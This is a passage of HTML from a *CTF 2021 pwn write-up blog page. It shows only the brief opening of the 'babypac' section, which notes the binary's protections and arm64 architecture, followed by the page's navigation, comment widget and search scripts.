+<h1 id="0x03-babypac"><a href="#0x03-babypac" class="headerlink" title="0x03.babypac"></a>0x03.babypac</h1><p><a href="/download/starCTF2021/pwn/babypac.zip" title="点击此处下载原题">点击下载-babypac.zip</a></p>
+<p>惯例的<code>checksec</code>，发现只开了NX和RELRO</p>
+<p><img src="https://i.loli.net/2021/01/28/R4wx9ihydgnmjaq.png"></p>
+<p>但是与其他题目所不同的是<strong>这是一个arm64架构的程序</strong></p>
+<blockquote>
+<p>关于arm64架构调试相关见<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3154">先知社区： ARM64 调试环境搭建及 ROP 实战 </a></p>
+</blockquote>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2021-01-20 02:33:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CTF/" title="CTF">
+                        <b>#</b> CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Pwn/" title="Pwn">
+                        <b>#</b> Pwn
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
+                        <b>#</b> 信息安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E2%AD%90CTF/" title="⭐CTF">
+                        <b>#</b> ⭐CTF
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%A0%86/" title="堆">
+                        <b>#</b> 堆
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/CTF/" title="CTF">
+                        <b>#</b> CTF
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/tcache-poisoning/" title="tcache poisoning">
+                        <b>#</b> tcache poisoning
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/double-free/" title="double free">
+                        <b>#</b> double free
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Use-After-Free/" title="Use After Free">
+                        <b>#</b> Use After Free
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/02/01/NOTE-0X01-FUZZ-START-FROM-ZERO-PART-I/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%BB%AA%E8%AE%BA"><span class="toc-text">0x00.绪论</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-babyheap-Use-After-Free-tcache-poisoning"><span class="toc-text">0x01.babyheap - Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-babygame-double-free-tcache-poisoning"><span class="toc-text">0x02.babygame - double free + tcache poisoning</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-babypac"><span class="toc-text">0x03.babypac</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
+        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
+        placeholder: '说点什么呗...',
+        avatar: 'retro',
+        lang: 'zh-CN'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="mailto:arttnba@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CTF.0X02%E3%80%91*CTF2021-Pwn%20WP + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F01%2F20%2FCTF-0X02-STARCTF2021-PWN%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
